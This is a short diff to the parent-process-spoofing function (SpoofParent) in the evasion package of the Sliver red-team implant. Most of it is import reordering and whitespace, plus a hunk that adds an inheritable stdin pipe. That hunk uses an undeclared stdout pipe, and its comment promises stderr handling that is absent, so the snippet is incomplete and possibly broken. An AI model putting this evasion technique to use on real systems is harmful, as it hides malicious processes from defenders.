@@ -1,13 +1,14 @@
 package evasion
 
 import (
-	"golang.org/x/sys/windows"
 	"github.com/bishopfox/sliver/sliver/syscalls"
+	"golang.org/x/sys/windows"
+
 	//{{if .Debug}}
 	"log"
 	//{{end}}
-	"io/ioutil"
 	"debug/pe"
+	"io/ioutil"
 	"os/exec"
 	"unsafe"
 )
@@ -59,7 +60,7 @@ func SpoofParent(ppid uint32, prog string, args string) (*windows.ProcessInforma
 		//{{end}}
 		return nil, err
 	}
-	
+
 	// get program path as a UTF string
 	programPath, err := exec.LookPath(prog)
 	if err != nil {
@@ -76,6 +77,16 @@ func SpoofParent(ppid uint32, prog string, args string) (*windows.ProcessInforma
 		return nil, err
 	}
 
+	// Create pipes for stdin/stdout/stderr
+	var stdinReadPipe, stdinWritePipe windows.Handle
+	err = windows.CreatePipe(&stdinReadPipe, &stdinWritePipe, &windows.SecurityAttributes{
+		InheritHandle: 1,
+	}, 0)
+	if err != nil {
+		return nil, err
+	}
+	startupInfo.StdInput = stdinReadPipe
+	startupInfo.StdOutput = stdoutWritePipe
 	// start a process of the specified program name, spoofing the parent
 	var procInfo windows.ProcessInformation
 	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
